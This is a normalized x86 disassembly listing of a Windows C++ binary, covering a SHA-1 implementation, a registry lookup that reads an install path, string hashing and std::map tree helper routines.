shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x28 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x18 ]
xor eax ebx
mov [ esp + 0x64 ] ebx
xor eax [ esp + 0x68 ]
add ebp [ esp + 0x28 ]
mov ebx [ esp + 0x14 ]
add eax ebp
lea ebp [ ebx + eax - 0x359d3e2a ]
mov eax [ esp + 0x68 ]
mov ebx eax
shl ebx 0x1e
shr eax 0x2
or ebx eax
mov [ esp + 0x14 ] ebp
mov [ esp + 0x68 ] ebx
mov ebx [ esp + 0x34 ]
mov eax [ esp + 0x4c ]
xor eax ebx
xor eax [ esp + 0x2c ]
xor eax [ esp + 0x20 ]
mov ebx eax
add eax eax
shr ebx 0x1f
or ebx eax
mov eax ebp
shr eax 0x1b
shl ebp 0x5
or eax ebp
mov ebp [ esp + 0x64 ]
mov [ esp + 0x2c ] ebx
mov ebx [ esp + 0x10 ]
xor ebx ebp
xor ebx [ esp + 0x68 ]
add eax [ esp + 0x2c ]
add ebx eax
mov eax [ esp + 0x18 ]
lea eax [ eax + ebx - 0x359d3e2a ]
mov ebp [ esp + 0x38 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x10 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax edi
xor eax ebp
xor eax [ esp + 0x30 ]
xor eax [ esp + 0x24 ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x30 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
xor ebx eax
xor ebx [ esp + 0x68 ]
add ebp [ esp + 0x30 ]
mov eax [ esp + 0x64 ]
add ebx ebp
mov ebp [ esp + 0x3c ]
lea eax [ eax + ebx - 0x359d3e2a ]
mov [ esp + 0x64 ] eax
mov eax [ esp + 0x14 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax [ esp + 0x54 ]
xor eax ebp
xor eax [ esp + 0x34 ]
xor eax [ esp + 0x28 ]
mov ebp eax
shr ebp 0x1f
add eax eax
or ebp eax
mov eax [ esp + 0x64 ]
mov [ esp + 0x34 ] ebp
mov ebp eax
mov [ esp + 0x14 ] ebx
shr ebp 0x1b
shl eax 0x5
or ebp eax
mov eax [ esp + 0x10 ]
xor eax ebx
xor eax [ esp + 0x18 ]
add ebp [ esp + 0x34 ]
add eax ebp
mov ebx [ esp + 0x68 ]
lea eax [ ebx + eax - 0x359d3e2a ]
mov [ esp + 0x68 ] eax
mov eax [ esp + 0x18 ]
mov ebp [ esp + 0x40 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax ecx
xor eax ebp
xor eax [ esp + 0x38 ]
xor eax [ esp + 0x2c ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x68 ]
mov [ esp + 0x38 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x14 ]
xor eax ebx
mov [ esp + 0x18 ] ebx
xor eax [ esp + 0x64 ]
add ebp [ esp + 0x38 ]
mov ebx [ esp + 0x10 ]
add eax ebp
mov ebp [ esp + 0x44 ]
lea eax [ ebx + eax - 0x359d3e2a ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x64 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax edx
xor eax ebp
xor eax [ esp + 0x3c ]
xor eax [ esp + 0x30 ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x3c ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x18 ]
xor eax ebx
mov [ esp + 0x64 ] ebx
xor eax [ esp + 0x68 ]
add ebp [ esp + 0x3c ]
mov ebx [ esp + 0x14 ]
add eax ebp
lea ebp [ ebx + eax - 0x359d3e2a ]
mov eax [ esp + 0x68 ]
mov ebx eax
mov [ esp + 0x14 ] ebp
shl ebx 0x1e
shr eax 0x2
or ebx eax
mov eax [ esp + 0x48 ]
mov [ esp + 0x68 ] ebx
xor eax [ esp + 0x40 ]
xor eax [ esp + 0x34 ]
xor eax [ esp + 0x20 ]
mov ebx eax
add eax eax
shr ebx 0x1f
or ebx eax
mov eax ebp
shr eax 0x1b
shl ebp 0x5
or eax ebp
mov ebp [ esp + 0x64 ]
mov [ esp + 0x40 ] ebx
mov ebx [ esp + 0x10 ]
xor ebx ebp
xor ebx [ esp + 0x68 ]
add eax [ esp + 0x40 ]
add ebx eax
mov eax [ esp + 0x18 ]
lea eax [ eax + ebx - 0x359d3e2a ]
mov ebp [ esp + 0x44 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x10 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax [ esp + 0x4c ]
xor eax ebp
xor eax [ esp + 0x38 ]
xor eax [ esp + 0x24 ]
mov ebp eax
add eax eax
shr ebp 0x1f
or ebp eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x44 ] ebp
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x10 ] ebx
xor ebx eax
xor ebx [ esp + 0x68 ]
add ebp [ esp + 0x44 ]
mov eax [ esp + 0x64 ]
add ebx ebp
mov ebp [ esp + 0x48 ]
lea eax [ eax + ebx - 0x359d3e2a ]
mov [ esp + 0x64 ] eax
mov eax [ esp + 0x14 ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
mov eax edi
xor eax ebp
xor eax [ esp + 0x3c ]
xor eax [ esp + 0x28 ]
mov ebp eax
shr ebp 0x1f
add eax eax
or ebp eax
mov [ esp + 0x14 ] ebx
mov [ esp + 0x48 ] ebp
mov eax [ esp + 0x64 ]
mov ebp eax
shl eax 0x5
shr ebp 0x1b
or ebp eax
mov eax [ esp + 0x10 ]
xor eax ebx
xor eax [ esp + 0x18 ]
add ebp [ esp + 0x48 ]
mov ebx [ esp + 0x68 ]
add eax ebp
lea eax [ ebx + eax - 0x359d3e2a ]
mov ebp [ esp + 0x4c ]
mov [ esp + 0x68 ] eax
mov eax [ esp + 0x18 ]
mov ebx eax
shl ebx 0x1e
shr eax 0x2
or ebx eax
mov eax [ esp + 0x54 ]
xor eax ebp
xor eax [ esp + 0x40 ]
xor eax [ esp + 0x2c ]
mov ebp eax
shr ebp 0x1f
add eax eax
or ebp eax
mov eax [ esp + 0x68 ]
mov [ esp + 0x4c ] ebp
mov [ esp + 0x18 ] ebx
mov ebp eax
shr ebp 0x1b
shl eax 0x5
or ebp eax
mov eax [ esp + 0x14 ]
xor eax ebx
xor eax [ esp + 0x64 ]
add ebp [ esp + 0x4c ]
mov ebx [ esp + 0x10 ]
add eax ebp
lea eax [ ebx + eax - 0x359d3e2a ]
mov ebx [ esp + 0x64 ]
mov ebp ebx
shr ebx 0x2
shl ebp 0x1e
or ebp ebx
mov ebx ecx
xor ebx edi
xor ebx [ esp + 0x44 ]
xor ebx [ esp + 0x30 ]
mov edi ebx
shr edi 0x1f
add ebx ebx
or edi ebx
mov [ esp + 0x50 ] edi
mov edi eax
shr edi 0x1b
mov ebx eax
shl ebx 0x5
or edi ebx
mov ebx [ esp + 0x18 ]
xor ebx ebp
mov [ esp + 0x64 ] ebp
xor ebx [ esp + 0x68 ]
add edi [ esp + 0x50 ]
add ebx edi
mov edi [ esp + 0x14 ]
lea ebp [ edi + ebx - 0x359d3e2a ]
mov edi [ esp + 0x68 ]
mov [ esp + 0x14 ] ebp
mov ebx edi
shl ebx 0x1e
shr edi 0x2
or ebx edi
mov [ esp + 0x68 ] ebx
mov ebx [ esp + 0x54 ]
mov edi edx
xor edi ebx
xor edi [ esp + 0x48 ]
xor edi [ esp + 0x34 ]
mov ebx edi
shr ebx 0x1f
add edi edi
or ebx edi
mov edi ebp
shl ebp 0x5
mov [ esp + 0x54 ] ebx
mov ebx eax
shr edi 0x1b
or edi ebp
xor ebx [ esp + 0x64 ]
xor ebx [ esp + 0x68 ]
add edi [ esp + 0x54 ]
mov ebp [ esp + 0x38 ]
add ebx edi
mov edi [ esp + 0x18 ]
lea edi [ edi + ebx - 0x359d3e2a ]
mov ebx eax
shr eax 0x2
shl ebx 0x1e
or ebx eax
xor ecx [ esp + 0x4c ]
mov eax [ esp + 0x20 ]
xor ecx ebp
xor ecx eax
mov ebp [ esp + 0x14 ]
mov eax ecx
add ecx ecx
shr eax 0x1f
or eax ecx
mov [ esp + 0x58 ] eax
mov eax edi
shr eax 0x1b
mov ecx edi
shl ecx 0x5
or eax ecx
mov ecx ebx
xor ecx ebp
xor ecx [ esp + 0x68 ]
add eax [ esp + 0x58 ]
add ecx eax
mov eax [ esp + 0x64 ]
lea ebp [ eax + ecx - 0x359d3e2a ]
mov ecx [ esp + 0x14 ]
mov eax ecx
shr ecx 0x2
shl eax 0x1e
or eax ecx
xor edx [ esp + 0x50 ]
xor edx [ esp + 0x3c ]
xor edx [ esp + 0x24 ]
mov ecx edx
add edx edx
shr ecx 0x1f
or ecx edx
mov edx ebp
mov [ esp + 0x64 ] ebp
shr edx 0x1b
shl ebp 0x5
or edx ebp
add ecx edx
mov ebp [ esp + 0x68 ]
mov edx ebx
xor edx eax
xor edx edi
add edx ebp
lea edx [ edx + ecx - 0x359d3e2a ]
mov ecx [ esi ]
add ecx edx
mov edx [ esp + 0x64 ]
mov [ esi ] ecx
mov ecx [ esi + 0x4 ]
add ecx edx
mov edx [ esi + 0x8 ]
mov [ esi + 0x4 ] ecx
mov ecx edi
shl ecx 0x1e
shr edi 0x2
or ecx edi
add ecx edx
mov [ esi + 0x8 ] ecx
mov ecx [ esi + 0xc ]
add ecx eax
mov eax [ esi + 0x10 ]
add eax ebx
pop edi
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] eax
pop esi
pop ebp
pop ebx
add esp 0x50
retn 0x8
sub_422fc0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
test ebp ebp
mov ebx ecx
jbe r-xdata
pop ebp
pop ebx
retn 0x8
mov eax [ ebx + 0x14 ]
push edi
mov edi eax
and edi 0x3f
mov ecx 0x40
add eax ebp
sub ecx edi
cmp eax ebp
mov [ esp + 0x14 ] ecx
mov [ ebx + 0x14 ] eax
jae r-xdata
test edi edi
push esi
je r-xdata
inc [ ebx + 0x18 ]
cmp ebp 0x40
jb r-xdata
cmp ebp ecx
jb r-xdata
test ebp ebp
je r-xdata
mov esi ebp
shr esi 0x6
mov esi [ esp + 0x14 ]
mov eax ecx
shr ecx 0x2
lea edi [ edi + ebx + 0x1c ]
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebx + 0x1c ]
push ecx
push ebx
mov ecx ebx
call sub_421320
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
add ecx eax
sub ebp eax
mov [ esp + 0x14 ] ecx
xor edi edi
pop esi
pop edi
mov esi [ esp + 0x14 ]
mov ecx ebp
mov eax ecx
shr ecx 0x2
lea edi [ edi + ebx + 0x1c ]
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edx [ esp + 0x14 ]
push edx
push ebx
mov ecx ebx
call sub_421320
mov ecx [ esp + 0x14 ]
add ecx 0x40
sub ebp 0x40
dec esi
mov [ esp + 0x14 ] ecx
jne r-xdata
sub_423080
sub esp 0xc
mov eax [ rw-data ]
push ebx
mov [ esp + 0xc ] eax
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x18 ]
mov eax ecx
shr eax 0x1d
shl edx 0x3
or eax edx
mov ebx eax
shr ebx 0x18
mov [ esp + 0x8 ] bl
mov ebx eax
shr ebx 0x10
mov [ esp + 0xb ] al
lea edx [ ecx * 8 ]
mov [ esp + 0x9 ] bl
mov ebx eax
mov eax edx
shr eax 0x18
mov [ esp + 0xc ] al
mov eax edx
shr eax 0x10
mov [ esp + 0xd ] al
mov eax edx
shr eax 0x8
shr ebx 0x8
and ecx 0x3f
cmp ecx 0x38
mov [ esp + 0xe ] al
push edi
mov [ esp + 0xe ] bl
mov [ esp + 0x13 ] dl
mov eax 0x38
jb r-xdata
sub eax ecx
push eax
push rw-data
mov ecx esi
call sub_422fc0
push 0x8
lea ecx [ esp + 0x10 ]
push ecx
mov ecx esi
call sub_422fc0
mov dl [ esi + 0x3 ]
mov eax [ esp + 0x1c ]
mov [ eax ] dl
mov cl [ esi + 0x2 ]
mov [ eax + 0x1 ] cl
mov edx [ esi ]
shr edx 0x8
mov [ eax + 0x2 ] dl
mov cl [ esi ]
mov [ eax + 0x3 ] cl
mov dl [ esi + 0x7 ]
mov [ eax + 0x4 ] dl
mov cl [ esi + 0x6 ]
mov [ eax + 0x5 ] cl
mov edx [ esi + 0x4 ]
shr edx 0x8
mov [ eax + 0x6 ] dl
mov cl [ esi + 0x4 ]
mov [ eax + 0x7 ] cl
mov dl [ esi + 0xb ]
mov [ eax + 0x8 ] dl
mov cl [ esi + 0xa ]
mov [ eax + 0x9 ] cl
mov edx [ esi + 0x8 ]
shr edx 0x8
mov [ eax + 0xa ] dl
mov cl [ esi + 0x8 ]
mov [ eax + 0xb ] cl
mov dl [ esi + 0xf ]
mov [ eax + 0xc ] dl
mov cl [ esi + 0xe ]
mov [ eax + 0xd ] cl
mov edx [ esi + 0xc ]
shr edx 0x8
mov [ eax + 0xe ] dl
mov cl [ esi + 0xc ]
mov [ eax + 0xf ] cl
mov dl [ esi + 0x13 ]
mov [ eax + 0x10 ] dl
mov cl [ esi + 0x12 ]
mov [ eax + 0x11 ] cl
mov edx [ esi + 0x10 ]
shr edx 0x8
mov [ eax + 0x12 ] dl
mov cl [ esi + 0x10 ]
mov [ eax + 0x13 ] cl
xor eax eax
lea edi [ esi + 0x1c ]
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi ] 0x67452301
mov [ esi + 0x4 ] 0xefcdab89
mov [ esi + 0x8 ] 0x98badcfe
mov [ esi + 0xc ] 0x10325476
mov [ esi + 0x10 ] 0xc3d2e1f0
mov ecx 0x10
[ edi ]
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
call sub_42e72f
add esp 0xc
retn 0x4
mov eax 0x78
sub_4231f0
mov edx ecx
xor eax eax
push edi
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] eax
mov ecx 0x10
lea edi [ edx + 0x1c ]
mov [ edx ] 0x67452301
mov [ edx + 0x4 ] 0xefcdab89
mov [ edx + 0x8 ] 0x98badcfe
mov [ edx + 0xc ] 0x10325476
mov [ edx + 0x10 ] 0xc3d2e1f0
[ edi ]
mov eax edx
pop edi
retn
sub_423230
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x120
mov eax [ rw-data ]
push esi
push edi
mov [ esp + 0x124 ] eax
lea eax [ esp + 0xc ]
push eax
push 0x20019
push 0x0
push r--data
push 0x80000002
mov esi ecx
mov [ esp + 0x20 ] 0x0
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x124 ]
call sub_42e72f
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edx [ esp + 0xc ]
test edx edx
je r-xdata
mov [ esp + 0x18 ] al
mov ecx 0x40
lea edi [ esp + 0x19 ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x10 ]
push ecx
stosb [ edi ]
lea eax [ esp + 0x1c ]
push eax
push 0x0
push 0x0
push r--data
push edx
mov [ esp + 0x28 ] 0x104
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x18 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov [ esp + 0x14 ] eax
je r-xdata
lea ecx [ esp + 0x18 ]
push 0x5c
push ecx
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x18 ]
add esi 0x4
push edx
mov ecx esi
mov [ eax + 0x1 ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push r--data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
sub_423320
push 0xffffffff
push sub_432428
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push rw-data
mov [ esp + 0x4 ] rw-data
call [ EnterCriticalSection@IAT ]
mov [ esp + 0xc ] 0x0
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov [ esp + 0xc ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ rw-data ] 0x0
sub_423390
push 0xffffffff
push sub_43246c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x94
mov eax [ rw-data ]
push esi
mov [ esp + 0x94 ] eax
push r--data
lea ecx [ esp + 0xc ]
mov [ esp + 0x8 ] 0x0
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0xa0 ] 0x1
mov eax [ esp + 0xac ]
push eax
lea ecx [ esp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ esp + 0x38 ]
call sub_4231f0
lea ecx [ esp + 0x38 ]
call sub_4212e0
mov ecx [ esp + 0x1c ]
push ecx
lea ecx [ esp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ esp + 0x40 ]
call sub_422fc0
lea edx [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x3c ]
call sub_423080
mov esi [ esp + 0xa8 ]
lea eax [ esp + 0x24 ]
push eax
push esi
call sub_429d20
add esp 0x8
mov [ esp + 0x4 ] 0x1
mov [ esp + 0xa0 ] 0x0
lea ecx [ esp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x98 ]
mov eax esi
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0x94 ]
pop esi
call sub_42e72f
add esp 0xa0
retn
sub_423480
push 0xffffffff
push sub_432495
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x0
lea ecx [ esi + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4235c0
push 0xffffffff
push sub_4324b5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
mov [ esp + 0x8 ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x1c ]
push ecx
lea ecx [ esi + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x8
sub_423880
mov edx [ esp + 0x4 ]
mov eax [ edx ]
push ebx
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
mov bl [ esi + 0x35 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_423950
mov edx [ esp + 0x4 ]
mov eax [ edx ]
push ebx
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
mov bl [ esi + 0x45 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_423a00
mov edx [ esp + 0x8 ]
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx ]
mov dl [ esp + 0x14 ]
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] dl
mov [ eax + 0x11 ] 0x0
retn 0x14
sub_423ae0
mov eax [ ecx ]
mov dl [ eax + 0x35 ]
test dl dl
je r-xdata
mov edx [ eax ]
push ebx
mov bl [ edx + 0x35 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
retn
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x35 ]
test dl dl
jne r-xdata
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x35 ]
test bl bl
jne r-xdata
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] edx
pop ebx
retn
mov edx eax
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x35 ]
test bl bl
je r-xdata
mov dl [ eax + 0x35 ]
test dl dl
jne r-xdata
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x35 ]
test dl dl
je r-xdata
mov [ ecx ] eax
mov edx [ ecx ]
cmp edx [ eax ]
jne r-xdata
sub_423b90
mov eax [ ecx ]
mov dl [ eax + 0x45 ]
test dl dl
je r-xdata
mov edx [ eax ]
push ebx
mov bl [ edx + 0x45 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
retn
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x45 ]
test dl dl
jne r-xdata
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x45 ]
test bl bl
jne r-xdata
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] edx
pop ebx
retn
mov edx eax
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x45 ]
test bl bl
je r-xdata
mov dl [ eax + 0x45 ]
test dl dl
jne r-xdata
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x45 ]
test dl dl
je r-xdata
mov [ ecx ] eax
mov edx [ ecx ]
cmp edx [ eax ]
jne r-xdata
sub_423bf0
push 0xffffffff
push sub_4324d5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov edi [ esp + 0x1c ]
mov esi ecx
push edi
mov [ esp + 0xc ] esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x14 ] 0x0
add edi 0x1c
push edi
lea ecx [ esi + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_423de0
push 0xffffffff
push sub_4324eb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
add ecx 0xc
call sub_423480
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_423e40
push 0xffffffff
push sub_43251a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x18 ]
push esi
push r--data
mov [ esp + 0x8 ] 0x0
mov esi [ esp + 0x1c ]
push eax
push esi
call sub_410460
add esp 0xc
mov ecx [ esp + 0x8 ]
mov eax esi
mov [ esp + 0x4 ] 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_423fb0
mov eax [ ecx + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi eax
mov al [ esi + 0x35 ]
test al al
jne r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push ebx
mov ebx [ esp + 0x10 ]
push ebp
mov ebp [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
lea ecx [ ecx ]
mov edi esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
lea eax [ esi + 0xc ]
push ebx
push eax
call ebp
add esp 0x8
test al al
je r-xdata
pop ebp
pop ebx
mov al [ esi + 0x35 ]
test al al
je r-xdata
sub_424020
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
mov bl [ esi + 0x11 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_424080
mov edx [ esp + 0x4 ]
mov eax [ edx ]
push ebx
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
mov bl [ esi + 0x11 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_424100
mov eax [ ecx + 0x4 ]
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi eax
mov al [ esi + 0x45 ]
test al al
jne r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push ebx
mov ebx [ esp + 0x10 ]
push ebp
mov ebp [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
lea ecx [ ecx ]
mov edi esi
mov esi [ esi ]
mov esi [ esi + 0x8 ]
jmp r-xdata
lea eax [ esi + 0xc ]
push ebx
push eax
call ebp
add esp 0x8
test al al
je r-xdata
pop ebp
pop ebx
mov al [ esi + 0x45 ]
test al al
je r-xdata
sub_424170
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
mov bl [ esi + 0x35 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
